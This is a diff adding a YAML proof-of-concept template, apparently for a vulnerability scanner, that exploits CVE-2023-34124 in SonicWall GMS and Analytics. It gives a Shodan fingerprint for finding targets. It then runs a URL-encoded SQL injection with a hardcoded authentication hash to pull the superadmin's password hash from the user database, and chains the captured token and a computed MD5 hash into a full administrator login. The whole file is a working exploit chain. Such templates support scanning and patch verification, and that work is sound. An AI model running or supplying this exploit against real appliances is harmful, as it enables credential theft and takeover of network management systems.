@@ -1,0 +1,51 @@
+id: poc-yaml-sonicwall-gms-and-analytics-authentication-bypass
+info:
+  name: SonicWall GMS and Analytics 身份认证绕过漏洞(CVE-2023-34124)
+  severity: critical
+  tags:
+  - CVE-2023-34124
+  - 认证绕过
+  finger: global_management_system,analytics
+  shodan: http.favicon.hash:-1381126564
+requests:
+- method: GET
+  path: /ws/msw/tenant/%27%20union%20select%20%28select%20ID%20from%20SGMSDB.DOMAINS%20limit%201%29%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%28select%20concat%28id%2C%20%27%3A%27%2C%20password%29%20from%20sgmsdb.users%20where%20active%20%3D%20%271%27%20order%20by%20issuperadmin%20desc%20limit%201%20offset%200%29%2C%27%27%2C%20%27%27%2C%20%27
+  headers:
+    Auth: '{"user":"system","hash":"/J50ZtvLJddOf5FI4nYdMJcX8IQ="}'
+  expression: 'status_code == 200
+
+    && contains(headers,"security_token=")
+
+    && contains(headers,"application/json")
+
+    && contains(body,"alias")
+
+    '
+  output:
+  - regex_match(headers,"security_token=(?P<token>([a-zA-Z0-9]+));")
+  - regex_match(body,"(?P<passwd>[0-9a-z]{32})")
+  - regex_match(body,"\"alias\":\"(?P<username>[a-zA-Z]+)")
+- method: GET
+  path: /appliance/login
+  headers:
+    Cookie: security_token={{.token}}
+  expression: status_code == 200
+  output:
+  - regex_match(headers,"JSESSIONID=(?P<cookie>([a-zA-Z0-9]+));")
+  - regex_match(body,"(?P<getPwdHash>[0-9]{32})")
+  - set_var("clientHash", md5(concat(getPwdHash,passwd)))
+- method: POST
+  path: /appliance/applianceMainPage
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: JSESSIONID={{.cookie}}; security_token={{.token}}
+  data: action=login&skipSessionCheck=0&needPwdChange=0&clientHash={{.clientHash}}&password={{.passwd}}&applianceUser={{.username}}&appliancePassword=Nice%20Try&ctlTimezoneOffset=0
+  expression: 'status_code == 200
+
+    && contains(body,"<title>SonicWall Universal Management Appliance</title>")
+
+    && !contains(body,"Login")
+
+    '
+variables: {}
+transport: http
